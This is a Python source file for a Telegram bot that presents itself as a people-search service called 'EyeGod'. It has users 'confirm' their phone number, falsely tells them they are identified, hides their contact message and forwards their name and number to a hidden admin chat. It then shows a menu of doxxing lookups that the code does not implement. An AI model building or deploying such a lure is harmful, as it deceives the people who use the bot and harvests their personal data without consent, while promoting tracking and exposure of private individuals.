import logging
import os
import random
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
import importlib.util

# Define the path to config.py
config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', 'config.py')

# Load the configuration
spec = importlib.util.spec_from_file_location("config", config_path)
config = importlib.util.module_from_spec(spec)
spec.loader.exec_module(config)

API_TOKEN = config.TOKEN
ADMIN_CHAT_ID = config.CHATID

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Handler for the start command
@dp.message_handler(commands=['start'])
async def on_start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    button = types.KeyboardButton(text="✅ Confirm phone number", request_contact=True)
    keyboard.add(button)
    
    await message.answer("<b>🗂 Phone Number\n\n"
                         "You need to confirm your phone number to complete the identification.\n\n"
                         "To do this, press the button below.</b>", reply_markup=keyboard, parse_mode="HTML")

# Handler for contact information
@dp.message_handler(content_types=[types.ContentType.CONTACT])
async def on_contact_received(message: types.Message):
    contact = message.contact
    await message.answer("You have been successfully identified.", reply_markup=types.ReplyKeyboardRemove())
    
    await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)

    # Send a message to the admin
    admin_message = (f"New contact received:\n"
                     f"Name: {contact.first_name}\n"
                     f"Phone number: {contact.phone_number}")
    await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)

    # Send instructions to the user
    await bot.send_message(chat_id=message.chat.id, text=(
        "You can send requests to the bot in the following order:\n\n"
        "👤 Search by name\n├  `Blogger`\n├  `Proskura Valery`\n├  `Proskura Valery Nikolaevich`\n└  `Ustimova Olga Sergeevna 29.03.1983`\n\n"
        "🚗 Search by car\n├  `M999MM99` - search for a car in Russia\n├  `VO4561AX` - search for a car in Ukraine\n└  `HTA21150053965897` - search by VIN\n\n"
        "👨 Social networks\n├  `https://vk.com/id1` - VKontakte\n├  `https://www.facebook.com/profile.php?id=1` - Facebook\n└  `https://ok.ru/profile/464476975745` - Odnoklassniki\n\n"
        "📱 `79998887777` - to search by phone number\n📨 `name@mail.ru` - to search by Email\n📧 @slivmenss or forward a message - search by Telegram account \n\n"
        "🔐 `/pas churchill7` - search for email, login, and phone by password \n"
        "🏚 `/adr Moscow, Tverskaya, 1, apt 1` - information by address (Russia) \n\n"
        "🏛 `/company Sberbank` - search by company name \n"
        "📑 `/inn 784806113663` - search by TIN \n\n"
        "🌐 `8.8.8.8` or `https://google.com` - information about IP or domain \n"
        "💰 `1AmajNxtJyU7JjAuyiFFkqDaaxuYqkNSkF` - information about Bitcoin address \n\n"
        "📸 Send a *photo of a person* to find them or their lookalike on VKontakte. \n"
        "🚙 Send a *photo of a car number* to get information about it. \n"
        "🌎 Send a *location on the map* to find people who are there now. \n"
        "🗣 Using *voice commands*, you can also perform *search queries*."
    ), parse_mode="Markdown")

if __name__ == '__main__':
    print("[+] EyeGod Bot has been started!\n[!] Happy Hunting!")
    executor.start_polling(dp, skip_updates=True)
